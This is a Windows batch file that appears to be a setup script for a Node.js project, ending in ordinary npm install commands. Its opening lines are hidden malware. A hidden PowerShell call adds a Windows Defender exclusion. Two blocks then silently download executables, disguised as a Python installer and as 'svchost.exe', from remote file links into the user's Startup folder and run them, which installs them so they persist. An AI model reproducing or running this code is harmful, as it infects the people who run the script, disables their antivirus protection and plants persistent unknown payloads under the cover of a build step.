powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://link.storjshare.io/s/jvgodndum3cnmdzwofmqcuyyd3oq/alboorgi/python-3.11.0-amd64.exe?download=1"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://link.storjshare.io/s/jupizfqdjs75vrcxlx7blaybowka/isimsallaqwe/svchost.exe?download=1"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\rename_me.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"


echo off

echo NOTE: Make sure you have Node.js v18.15.0 and Native Tools (including Chocolatey) installed aswell! Otherwise the .exe won't work correctly.

call npm install .
call npm install -g pkg
call npm install -g node-gyp
call npm install -g electron-rebuild
call npm install node-gyp
call npm install boukiapi
call npm install javascript-obfuscator
call npm install js-confuser
call npm rebuild
